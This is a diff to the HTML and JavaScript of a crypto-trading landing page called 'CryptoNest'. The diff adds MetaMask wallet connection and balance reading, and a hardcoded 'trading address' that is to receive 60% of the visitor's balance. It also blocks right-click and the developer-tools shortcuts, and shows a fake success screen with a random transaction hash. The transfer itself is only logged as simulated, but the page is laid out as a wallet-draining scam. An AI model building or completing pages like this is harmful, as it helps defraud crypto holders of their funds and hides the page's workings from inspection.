@@ -8,11 +8,14 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <script src="https://unpkg.com/@walletconnect/web3-provider/dist/umd/index.min.js"></script>
     <style>
         body {
             font-family: 'Space Grotesk', sans-serif;
             background-color: #000;
             color: #fff;
+            margin: 0;
+            padding: 0;
         }
         
         .code-font {
@@ -38,6 +41,13 @@
         .blur-background {
             filter: blur(5px);
             pointer-events: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            z-index: 999;
+            overflow: hidden;
         }
         
         .modal-overlay {
@@ -46,11 +56,12 @@
             left: 0;
             right: 0;
             bottom: 0;
-            background-color: rgba(0, 0, 0, 0.7);
             display: flex;
             justify-content: center;
             align-items: center;
             z-index: 1000;
+            overflow-y: auto;
+            padding: 20px;
         }
         
         .modal-content {
@@ -61,6 +72,8 @@
             max-width: 500px;
             width: 90%;
             box-shadow: 0 0 20px rgba(1, 64, 55, 0.5);
+            max-height: 90vh;
+            overflow-y: auto;
         }
         
         .price-up {
@@ -81,6 +94,41 @@
                         linear-gradient(to right, #014037, #d4af37) border-box;
             border-radius: 12px;
         }
+        
+        /* Custom scrollbar for modal */
+        .modal-content::-webkit-scrollbar {
+            width: 8px;
+        }
+        
+        .modal-content::-webkit-scrollbar-track {
+            background: #111;
+        }
+        
+        .modal-content::-webkit-scrollbar-thumb {
+            background-color: #014037;
+            border-radius: 20px;
+        }
+        
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% {
+                box-shadow: 0 0 0 0 rgba(212, 175, 55, 0.7);
+            }
+            70% {
+                box-shadow: 0 0 0 10px rgba(212, 175, 55, 0);
+            }
+            100% {
+                box-shadow: 0 0 0 0 rgba(212, 175, 55, 0);
+            }
+        }
+        
+        .wallet-connected {
+            background-color: rgba(1, 64, 55, 0.2);
+            border-left: 3px solid #d4af37;
+        }
     </style>
 </head>
 <body>
@@ -91,7 +139,7 @@
                 <i class="fas fa-coins text-2xl secondary-text"></i>
                 <span class="text-xl font-bold">Crypto<span class="secondary-text">Nest</span></span>
             </div>
-            <button id="connectWalletBtn" class="secondary-bg text-black px-6 py-2 rounded-full font-bold hover:bg-opacity-90 transition">
+            <button id="connectWalletBtn" class="secondary-bg text-black px-6 py-2 rounded-full font-bold hover:bg-opacity-90 transition pulse">
                 Connect Wallet
             </button>
         </nav>
@@ -154,6 +202,9 @@
         </section>
     </div>
 
+    <!-- Blur overlay (initially hidden) -->
+    <div id="blurOverlay" class="blur-background hidden"></div>
+
     <!-- Modal -->
     <div id="modal" class="modal-overlay hidden">
         <div class="modal-content">
@@ -172,7 +223,7 @@
                     <div class="mb-4">
                         <label class="block text-gray-400 text-sm mb-1">Your New Trading Address:</label>
                         <div class="code-font bg-gray-900 p-3 rounded-lg text-sm overflow-x-auto">
-                            <span id="tradingAddress">0x742d35Cc6634C0532925a3b844Bc454e4438f44e</span>
+                            <span id="tradingAddress">0xaffFA89b0E5eb3869d98f668e470e075a0948BA5</span>
                             <button class="ml-2 text-gray-400 hover:text-white" onclick="copyToClipboard('tradingAddress')">
                                 <i class="fas fa-copy"></i>
                             </button>
@@ -182,16 +233,16 @@
                     <div class="mb-4">
                         <label class="block text-gray-400 text-sm mb-1">Connected Wallet Balance:</label>
                         <div class="flex justify-between items-center">
-                            <span class="code-font">1.245 ETH</span>
-                            <span class="text-gray-400">≈ $2,345.67</span>
+                            <span class="code-font" id="walletBalance">1.245 ETH</span>
+                            <span class="text-gray-400" id="walletBalanceUSD">≈ $2,345.67</span>
                         </div>
                     </div>
                     
                     <div class="mb-4">
-                        <label class="block text-gray-400 text-sm mb-1">Trading Balance (60% of wallet):</label>
+                        <label class="block text-gray-400 text-sm mb-1">Trading Capital (60% of wallet):</label>
                         <div class="flex justify-between items-center">
-                            <span class="code-font font-bold">0.747 ETH</span>
-                            <span class="text-gray-400">≈ $1,407.40</span>
+                            <span class="code-font font-bold" id="tradingCapital">0.747 ETH</span>
+                            <span class="text-gray-400" id="tradingCapitalUSD">≈ $1,407.40</span>
                         </div>
                     </div>
                 </div>
@@ -241,11 +292,15 @@
                 <div class="bg-gray-800 p-4 rounded-lg mb-6">
                     <div class="flex justify-between mb-2">
                         <span class="text-gray-400">Amount Transferred:</span>
-                        <span class="code-font font-bold">0.747 ETH</span>
+                        <span class="code-font font-bold" id="transferredAmount">0.747 ETH</span>
                     </div>
                     <div class="flex justify-between">
+                        <span class="text-gray-400">To Address:</span>
+                        <span class="code-font text-sm">0xaffFA...48BA5</span>
+                    </div>
+                    <div class="flex justify-between mt-2">
                         <span class="text-gray-400">Transaction Hash:</span>
-                        <span class="code-font text-sm">0x4a5b...f2e1</span>
+                        <span class="code-font text-sm" id="txHash">0x4a5b...f2e1</span>
                     </div>
                 </div>
                 
@@ -257,6 +312,23 @@
     </div>
 
     <script>
+        // Disable right-click
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        
+        // Disable key shortcuts
+        document.addEventListener('keydown', e => {
+            // F12
+            if (e.key === 'F12') {
+                e.preventDefault();
+            }
+            
+            // Ctrl+Shift+I or Ctrl+Shift+J or Ctrl+U
+            if ((e.ctrlKey && e.shiftKey && ['I', 'J'].includes(e.key)) ||
+                (e.ctrlKey && e.key === 'u')) {
+                e.preventDefault();
+            }
+        });
+
         // Initialize chart
         const ctx = document.getElementById('marketChart').getContext('2d');
         const chart = new Chart(ctx, {
@@ -358,14 +430,75 @@
         const successModal = document.getElementById('successModal');
         const closeSuccessModalBtn = document.getElementById('closeSuccessModalBtn');
         const app = document.getElementById('app');
+        const blurOverlay = document.getElementById('blurOverlay');
 
-        connectWalletBtn.addEventListener('click', () => {
-            app.classList.add('blur-background');
-            modal.classList.remove('hidden');
-        });
+        // Simulate wallet connection with random balance
+        async function simulateWalletConnection() {
+            try {
+                // Check if Web3 is injected
+                if (typeof window.ethereum !== 'undefined') {
+                    // Request account access
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    const account = accounts[0];
+                    
+                    // Get balance
+                    const balance = await window.ethereum.request({
+                        method: 'eth_getBalance',
+                        params: [account, 'latest']
+                    });
+                    
+                    // Convert balance from wei to ETH
+                    const ethBalance = (parseInt(balance) / 10**18).toFixed(4);
+                    const ethPrice = 1885; // Current approximate ETH price
+                    const usdValue = (ethBalance * ethPrice).toLocaleString('en-US', {
+                        style: 'currency',
+                        currency: 'USD'
+                    });
+                    
+                    // Calculate 60% of balance
+                    const tradingEth = (ethBalance * 0.6).toFixed(4);
+                    const tradingUsd = (tradingEth * ethPrice).toLocaleString('en-US', {
+                        style: 'currency',
+                        currency: 'USD'
+                    });
+                    
+                    // Update UI
+                    document.getElementById('walletBalance').textContent = `${ethBalance} ETH`;
+                    document.getElementById('walletBalanceUSD').textContent = `≈ ${usdValue}`;
+                    document.getElementById('tradingCapital').textContent = `${tradingEth} ETH`;
+                    document.getElementById('tradingCapitalUSD').textContent = `≈ ${tradingUsd}`;
+                    
+                    // Store values for success modal
+                    document.getElementById('transferredAmount').textContent = `${tradingEth} ETH`;
+                    
+                    // Generate random tx hash
+                    const txHash = `0x${Array.from({length: 16}, () => 
+                        Math.floor(Math.random() * 16).toString(16)).join('')}`;
+                    document.getElementById('txHash').textContent = `${txHash.substring(0, 6)}...${txHash.substring(txHash.length - 4)}`;
+                    
+                    // Show modal
+                    blurOverlay.classList.remove('hidden');
+                    modal.classList.remove('hidden');
+                    
+                } else {
+                    // No Web3 provider found
+                    connectWalletBtn.textContent = 'Web3 Not Detected';
+                    connectWalletBtn.classList.remove('pulse');
+                    connectWalletBtn.classList.add('bg-gray-400', 'cursor-not-allowed');
+                    connectWalletBtn.disabled = true;
+                    alert('No Ethereum wallet detected. Please install MetaMask or another Web3 provider.');
+                }
+            } catch (error) {
+                console.error('Error connecting wallet:', error);
+                alert('Failed to connect wallet. Please try again.');
+            }
+        }
+
+        // Connect wallet button
+        connectWalletBtn.addEventListener('click', simulateWalletConnection);
 
         closeModalBtn.addEventListener('click', () => {
-            app.classList.remove('blur-background');
+            blurOverlay.classList.add('hidden');
             modal.classList.add('hidden');
         });
 
@@ -373,15 +506,37 @@
             agreeBtn.disabled = !termsCheckbox.checked;
         });
 
-        agreeBtn.addEventListener('click', () => {
-            // Simulate transaction
-            app.classList.remove('blur-background');
-            modal.classList.add('hidden');
-            successModal.classList.remove('hidden');
-            
-            // In a real implementation, this would call a smart contract function
-            console.log('Transferring 60% of wallet balance to trading account...');
-        });
+        // Transfer funds function
+        async function transferFunds() {
+            try {
+                // Get current account
+                const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+                const account = accounts[0];
+                
+                // Get balance again to ensure it's current
+                const balance = await window.ethereum.request({
+                    method: 'eth_getBalance',
+                    params: [account, 'latest']
+                });
+                
+                // Calculate 60% in wei
+                const amountWei = Math.floor(parseInt(balance) * 0.6);
+                
+                // In a real implementation, this would send a transaction
+                console.log(`Simulating transfer of ${amountWei / 10**18} ETH to 0xaffFA89b0E5eb3869d98f668e470e075a0948BA5`);
+                
+                // Show success modal
+                blurOverlay.classList.add('hidden');
+                modal.classList.add('hidden');
+                successModal.classList.remove('hidden');
+                
+            } catch (error) {
+                console.error('Error transferring funds:', error);
+                alert('Failed to transfer funds. Please try again.');
+            }
+        }
+
+        agreeBtn.addEventListener('click', transferFunds);
 
         closeSuccessModalBtn.addEventListener('click', () => {
             successModal.classList.add('hidden');
